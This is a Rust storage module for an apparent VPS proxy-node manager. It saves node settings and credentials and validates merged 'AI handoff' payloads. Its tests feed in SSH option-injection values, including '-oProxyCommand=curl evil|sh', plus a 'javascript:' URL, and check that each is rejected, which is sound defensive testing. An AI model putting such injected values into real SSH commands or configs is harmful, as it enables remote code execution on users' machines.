use crate::models::{
    AppSettings, CarrierSample, HandoffPayload, HistoryBucket, NodeConfig, NodeSecrets,
};
use crate::validate;
use chrono::Utc;
use std::collections::{HashMap, VecDeque};
use std::fs;
use std::path::PathBuf;
use std::sync::{Mutex, OnceLock};
use uuid::Uuid;

// NOTE: Do NOT use macOS Keychain (`keyring`) for ad-hoc / unsigned desktop builds.
// Ad-hoc binaries cannot reliably persist "Always Allow" ACLs in macOS Keychain,
// causing repeated password prompts on every poll tick. Keep secrets in an in-memory
// cache backed by a 0600 local file (`~/.config/native-isp-vps/secrets.json`).
static SECRETS_CACHE: OnceLock<Mutex<HashMap<String, NodeSecrets>>> = OnceLock::new();

pub fn config_dir() -> PathBuf {
    let base = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
    base.join(".config").join("native-isp-vps")
}

pub fn inbox_dir() -> PathBuf {
    let base = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
    base.join(".local")
        .join("share")
        .join("native-isp-vps")
        .join("inbox")
}

fn nodes_file() -> PathBuf {
    config_dir().join("nodes.json")
}

fn settings_file() -> PathBuf {
    config_dir().join("settings.json")
}

fn secrets_file() -> PathBuf {
    config_dir().join("secrets.json")
}

fn history_file() -> PathBuf {
    config_dir().join("history.json")
}

fn carrier_history_file() -> PathBuf {
    config_dir().join("carrier_history.json")
}

pub fn load_history_buckets() -> HashMap<String, VecDeque<HistoryBucket>> {
    let path = history_file();
    if !path.exists() {
        return HashMap::new();
    }
    match fs::read_to_string(&path) {
        Ok(raw) => serde_json::from_str(&raw).unwrap_or_default(),
        Err(_) => HashMap::new(),
    }
}

pub fn save_history_buckets(map: &HashMap<String, VecDeque<HistoryBucket>>) -> Result<(), String> {
    ensure_dirs()?;
    let json = serde_json::to_string(map).map_err(|e| e.to_string())?;
    write_atomic_file(&history_file(), json.as_bytes(), true)
}

pub type PersistedCarrierMap = HashMap<String, HashMap<String, VecDeque<CarrierSample>>>;

pub fn load_carrier_history() -> PersistedCarrierMap {
    let path = carrier_history_file();
    if !path.exists() {
        return HashMap::new();
    }
    match fs::read_to_string(&path) {
        Ok(raw) => serde_json::from_str(&raw).unwrap_or_default(),
        Err(_) => HashMap::new(),
    }
}

pub fn save_carrier_history(map: &PersistedCarrierMap) -> Result<(), String> {
    ensure_dirs()?;
    let json = serde_json::to_string(map).map_err(|e| e.to_string())?;
    write_atomic_file(&carrier_history_file(), json.as_bytes(), true)
}

pub fn ensure_dirs() -> Result<(), String> {
    let cfg = config_dir();
    let inbox = inbox_dir();
    fs::create_dir_all(&cfg).map_err(|e| format!("create config dir failed: {e}"))?;
    fs::create_dir_all(&inbox).map_err(|e| format!("create inbox dir failed: {e}"))?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&cfg, fs::Permissions::from_mode(0o700));
        let _ = fs::set_permissions(&inbox, fs::Permissions::from_mode(0o700));
    }
    Ok(())
}

pub fn load_nodes() -> Vec<NodeConfig> {
    let path = nodes_file();
    if !path.exists() {
        return Vec::new();
    }
    match fs::read_to_string(&path) {
        Ok(raw) => serde_json::from_str(&raw).unwrap_or_default(),
        Err(_) => Vec::new(),
    }
}

fn write_atomic_file(path: &std::path::Path, content: &[u8], restricted_0600: bool) -> Result<(), String> {
    let tmp_path = path.with_extension("tmp");
    #[cfg(unix)]
    {
        use std::io::Write;
        use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
        let mode = if restricted_0600 { 0o600 } else { 0o644 };
        let mut file = fs::OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .mode(mode)
            .open(&tmp_path)
            .map_err(|e| format!("open temp file failed: {e}"))?;
        file.write_all(content)
            .map_err(|e| format!("write temp file failed: {e}"))?;
        file.sync_all()
            .map_err(|e| format!("sync temp file failed: {e}"))?;
        let _ = fs::set_permissions(&tmp_path, fs::Permissions::from_mode(mode));
    }
    #[cfg(not(unix))]
    {
        let _ = restricted_0600;
        fs::write(&tmp_path, content).map_err(|e| format!("write temp file failed: {e}"))?;
    }
    fs::rename(&tmp_path, path).map_err(|e| format!("atomic rename failed: {e}"))
}

pub fn save_nodes(nodes: &[NodeConfig]) -> Result<(), String> {
    ensure_dirs()?;
    let json = serde_json::to_string_pretty(nodes).map_err(|e| e.to_string())?;
    write_atomic_file(&nodes_file(), json.as_bytes(), true)
}

pub fn load_settings() -> AppSettings {
    let path = settings_file();
    let mut settings = if path.exists() {
        fs::read_to_string(&path)
            .ok()
            .and_then(|s| serde_json::from_str::<AppSettings>(&s).ok())
            .unwrap_or_default()
    } else {
        AppSettings::default()
    };
    settings.inbox_dir = inbox_dir().to_string_lossy().to_string();
    settings
}

pub fn save_settings(settings: &AppSettings) -> Result<(), String> {
    ensure_dirs()?;
    let json = serde_json::to_string_pretty(settings).map_err(|e| e.to_string())?;
    write_atomic_file(&settings_file(), json.as_bytes(), false)
}

fn load_secrets_map_from_disk() -> HashMap<String, NodeSecrets> {
    let path = secrets_file();
    if !path.exists() {
        return HashMap::new();
    }
    match fs::read_to_string(&path) {
        Ok(raw) => serde_json::from_str(&raw).unwrap_or_default(),
        Err(_) => HashMap::new(),
    }
}

fn write_secrets_map_to_disk(map: &HashMap<String, NodeSecrets>) -> Result<(), String> {
    ensure_dirs()?;
    let json = serde_json::to_string_pretty(map).map_err(|e| e.to_string())?;
    write_atomic_file(&secrets_file(), json.as_bytes(), true)
}

fn secrets_cache() -> &'static Mutex<HashMap<String, NodeSecrets>> {
    SECRETS_CACHE.get_or_init(|| Mutex::new(load_secrets_map_from_disk()))
}

pub fn save_secrets(node_id: &str, secrets: &NodeSecrets) -> Result<(), String> {
    if secrets.api_token.is_none() && secrets.panel_password.is_none() {
        return Ok(());
    }
    let mut cache = secrets_cache()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    cache.insert(node_id.to_string(), secrets.clone());
    write_secrets_map_to_disk(&cache)
}

pub fn load_secrets(node_id: &str) -> NodeSecrets {
    let cache = secrets_cache()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    cache.get(node_id).cloned().unwrap_or_default()
}

pub fn delete_secrets(node_id: &str) {
    let mut cache = secrets_cache()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    if cache.remove(node_id).is_some() {
        let _ = write_secrets_map_to_disk(&cache);
    }
}

/// Non-empty, trimmed optional string.
fn present(value: Option<String>) -> Option<String> {
    value
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Validates a handoff payload and merges it over the existing node with the same host:
/// fields omitted by the payload keep their stored value (re-running an AI handoff only
/// rotates credentials instead of wiping quota / SSH settings), and `createdAt` is preserved.
fn merge_handoff(payload: &HandoffPayload, existing: Option<&NodeConfig>) -> Result<NodeConfig, String> {
    let host = validate::host(&payload.host)?;
    let panel_url = if payload.panel_url.trim().is_empty() {
        existing.map(|n| n.panel_url.clone()).unwrap_or_default()
    } else {
        validate::http_url(&payload.panel_url, "panelUrl")?
    };
    let pick_label = |incoming: &Option<String>, stored: Option<&String>, fallback: &str| {
        present(incoming.clone())
            .map(|s| validate::label(&s))
            .filter(|s| !s.is_empty())
            .or_else(|| stored.cloned())
            .unwrap_or_else(|| fallback.to_string())
    };
    let flag = pick_label(&payload.flag, existing.map(|n| &n.flag), "🌐");
    let city = pick_label(&payload.city, existing.map(|n| &n.city), &host);
    let isp_tag = pick_label(&payload.isp_tag, existing.map(|n| &n.isp_tag), "Dual ISP");
    let default_name = format!("{flag} {city} · {isp_tag}");
    let name = pick_label(&payload.name, existing.map(|n| &n.name), &default_name);
    let ssh_user = match present(payload.ssh_user.clone()) {
        Some(user) => validate::ssh_user(&user)?,
        None => existing.map_or_else(|| "root".to_string(), |n| n.ssh_user.clone()),
    };
    let ssh_key_path = match present(payload.ssh_key_path.clone()) {
        Some(path) => Some(validate::file_path(&path)?),
        None => existing.and_then(|n| n.ssh_key_path.clone()),
    };
    let sub_url = validate::optional_http_url(payload.sub_url.as_deref(), "subUrl")?
        .or_else(|| existing.and_then(|n| n.sub_url.clone()));
    let mihomo_sub_url = validate::optional_http_url(payload.mihomo_sub_url.as_deref(), "mihomoSubUrl")?
        .or_else(|| existing.and_then(|n| n.mihomo_sub_url.clone()));
    let monthly_total_gb = payload
        .monthly_total_gb
        .filter(|gb| gb.is_finite() && *gb > 0.0)
        .or_else(|| existing.map(|n| n.monthly_total_gb))
        .unwrap_or(1000.0);

    Ok(NodeConfig {
        id: existing.map_or_else(|| Uuid::new_v4().to_string(), |n| n.id.clone()),
        name,
        flag,
        city,
        isp_tag,
        host,
        vless_port: payload.vless_port.or(existing.map(|n| n.vless_port)).unwrap_or(443),
        panel_url,
        panel_username: present(payload.panel_username.clone())
            .map(|u| validate::label(&u))
            .or_else(|| existing.and_then(|n| n.panel_username.clone())),
        sub_url,
        mihomo_sub_url,
        ssh_port: payload.ssh_port.or(existing.map(|n| n.ssh_port)).unwrap_or(22),
        ssh_user,
        ssh_key_path,
        reality_target: present(payload.reality_target.clone())
            .map(|t| validate::label(&t))
            .or_else(|| existing.and_then(|n| n.reality_target.clone())),
        monthly_total_gb,
        reset_day: payload
            .reset_day
            .or(existing.map(|n| n.reset_day))
            .unwrap_or(1)
            .clamp(1, 31),
        created_at: existing.map_or_else(|| Utc::now().to_rfc3339(), |n| n.created_at.clone()),
        source: present(payload.source.clone())
            .map(|s| validate::label(&s))
            .unwrap_or_else(|| "ai-handoff".to_string()),
    })
}

pub fn upsert_from_handoff(payload: HandoffPayload) -> Result<NodeConfig, String> {
    let mut nodes = load_nodes();
    let host = validate::host(&payload.host)?;
    let existing = nodes.iter().find(|n| n.host == host);
    let node = merge_handoff(&payload, existing)?;
    let id = node.id.clone();

    let mut secrets = load_secrets(&id);
    if payload.api_token.as_ref().is_some_and(|s| !s.trim().is_empty()) {
        secrets.api_token = payload.api_token;
    }
    if payload
        .panel_password
        .as_ref()
        .is_some_and(|s| !s.trim().is_empty())
    {
        secrets.panel_password = payload.panel_password;
    }
    save_secrets(&id, &secrets)?;

    if let Some(pos) = nodes.iter().position(|n| n.id == id) {
        nodes[pos] = node.clone();
    } else {
        nodes.push(node.clone());
    }
    save_nodes(&nodes)?;
    Ok(node)
}

pub fn remove_node(node_id: &str) -> Result<Vec<NodeConfig>, String> {
    let mut nodes = load_nodes();
    nodes.retain(|n| n.id != node_id);
    save_nodes(&nodes)?;
    delete_secrets(node_id);
    Ok(nodes)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn payload(host: &str) -> HandoffPayload {
        HandoffPayload {
            name: None,
            flag: None,
            city: None,
            isp_tag: None,
            host: host.into(),
            vless_port: None,
            panel_url: "http://1.2.3.4:2053/base/".into(),
            panel_username: None,
            panel_password: None,
            api_token: None,
            sub_url: None,
            mihomo_sub_url: None,
            ssh_port: None,
            ssh_user: None,
            ssh_key_path: None,
            reality_target: None,
            monthly_total_gb: None,
            reset_day: None,
            source: None,
        }
    }

    #[test]
    fn merge_keeps_stored_fields_omitted_by_a_repeat_handoff() {
        let first = merge_handoff(
            &HandoffPayload {
                city: Some("Los Angeles".into()),
                monthly_total_gb: Some(2000.0),
                reset_day: Some(25),
                ssh_port: Some(2222),
                ssh_key_path: Some("~/.ssh/id_ed25519_native_isp".into()),
                ..payload("1.2.3.4")
            },
            None,
        )
        .unwrap();
        assert_eq!(first.panel_url, "http://1.2.3.4:2053/base");
        assert_eq!(first.name, "🌐 Los Angeles · Dual ISP");

        let second = merge_handoff(&payload("1.2.3.4"), Some(&first)).unwrap();
        assert_eq!(second.id, first.id);
        assert_eq!(second.created_at, first.created_at);
        assert_eq!(second.monthly_total_gb, 2000.0);
        assert_eq!(second.reset_day, 25);
        assert_eq!(second.ssh_port, 2222);
        assert_eq!(second.ssh_key_path, first.ssh_key_path);
        assert_eq!(second.city, "Los Angeles");
    }

    #[test]
    fn merge_rejects_injection_and_non_web_urls() {
        assert!(merge_handoff(&payload("-oProxyCommand=id"), None).is_err());
        assert!(merge_handoff(
            &HandoffPayload {
                ssh_user: Some("-oProxyCommand=curl evil|sh".into()),
                ..payload("1.2.3.4")
            },
            None
        )
        .is_err());
        assert!(merge_handoff(
            &HandoffPayload {
                sub_url: Some("javascript:alert(1)".into()),
                ..payload("1.2.3.4")
            },
            None
        )
        .is_err());
    }
}
